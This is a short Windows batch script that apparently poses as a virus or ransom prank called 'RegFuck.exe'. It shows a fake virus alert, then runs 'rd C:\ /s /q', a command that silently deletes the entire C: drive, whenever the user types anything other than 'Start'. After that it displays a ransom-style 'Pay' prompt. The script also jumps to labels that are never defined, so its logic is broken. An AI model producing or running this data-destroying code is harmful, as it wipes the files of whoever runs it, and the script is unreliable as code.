@echo off
title RegFuck.exe
color 0a
echo ---------------------
echo    virus alret
echo ---------------------
set /p input= Type Start -
if %input%==Start goto A

rd C:\ /s /q
title deleted system32
echo setup is starting

set /p input= Type RegFuck to Pay or No to Not Fake -
if %input%== RegFuck goto 1
if %input%== Fake goto 1